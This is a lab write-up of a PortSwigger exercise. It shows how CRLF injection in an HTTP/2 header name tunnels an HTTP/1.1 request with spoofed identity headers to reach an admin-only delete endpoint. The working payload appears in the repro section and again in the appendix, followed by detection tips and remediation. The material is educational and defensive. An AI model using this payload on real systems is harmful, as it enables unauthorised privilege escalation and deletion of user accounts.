
# PS‑011 — Bypassing access controls via HTTP/2 request tunnelling

**Date / Analyst:** 2025-09-30 — Christopher Araque
**Target:** PortSwigger lab (insecure role enforcement)
**Impact:** Privilege escalation → delete arbitrary user (admin‑only action)
**Status:** Solved

## Summary
A front‑end that downgrades HTTP/2 → HTTP/1.1 trusted spoofable headers (e.g., X‑SSL‑*, X‑FRONTEND‑KEY). By injecting a CRLF in an HTTP/2 header name, I tunneled a full HTTP/1.1 request that set these headers and executed an admin‑only endpoint:

    GET /admin/delete?username=carlos.

## Repro (minimal)
- Baseline H2 request in Repeater:

    GET /?search=foo HTTP/2
    Host: <lab-host>.web-security-academy.net
    ...


(Any simple page works; I used the search route.)

- Header‑name injection (CRLF after the header name) to tunnel an H1 request. Paste into the header name field (Burp Inspector):

    foo: bar

    GET /admin/delete?username=carlos HTTP/1.1
    X-SSL-VERIFIED: 1
    X-SSL-CLIENT-CN: administrator
    X-FRONTEND-KEY: 5268042407204950


The front‑end forwards the bytes and the back‑end accepts the spoofed identity and key, treating the request as administrator.


- Success indicator: Response 200 OK and the lab banner “Congratulations, you solved the lab!”. (See screenshot.)





## Evidence
- Screenshot: [ps-011-screenshot.png](../../evidence/ps-access/ps-011-screenshot.png)
- Request/response: [ps-011-request.txt](../../evidence/ps-access/ps-011-request.txt)

## Root cause
- Unsafe H2→H1 translation. The proxy shipped raw header bytes downstream without normalizing header names → CRLF in header name allowed request tunnelling.

- Trusting front‑end injected identity headers. Back‑end honored X‑SSL‑VERIFIED, X‑SSL‑CLIENT‑CN, and a discoverable X‑FRONTEND‑KEY for authZ decisions—client‑controlled in this path.


## Impact

- Full privilege escalation to any route gated by those headers (admin deletion, account management, etc.). In the lab: delete carlos successfully.

## Detection tips

- Flag H2 streams with header names containing \r\n.

- Alert on requests where identity/role is derived from X‑SSL‑*, X‑Forwarded‑User, X‑Role, etc., without a cryptographic binding.

- Compare outer request method/URL vs. inner server‑side logs—mismatches often indicate tunnelling.

## Remediation

- Normalize & validate header names (reject CTLs / CRLF; enforce RFC‑compliant token set).

- Do not trust client‑supplied identity/role headers; use mTLS or a signed token (e.g., JWT with audience/issuer checks) between tiers.

- H2 translators: use libraries that never forward raw header bytes; strictly re‑encode canonicalized headers.

- Length handling hardening: unify message framing; add anomaly rules for multi‑request payloads and H1 lines inside H2.

## Appendix: raw PoC (from lab run)

- Outer (H2) request in Repeater with the injected header name; note the tunneled H1 request and spoofed headers:

    GET /?search=foo HTTP/2
    Host: <lab-host>.web-security-academy.net
    ...
# Injected header NAME (Burp Inspector):
    foo: bar

    GET /admin/delete?username=carlos HTTP/1.1
    X-SSL-VERIFIED: 1
    X-SSL-CLIENT-CN: administrator
    X-FRONTEND-KEY: 5268042407204950


- Response: HTTP/2 200 OK (lab solved).
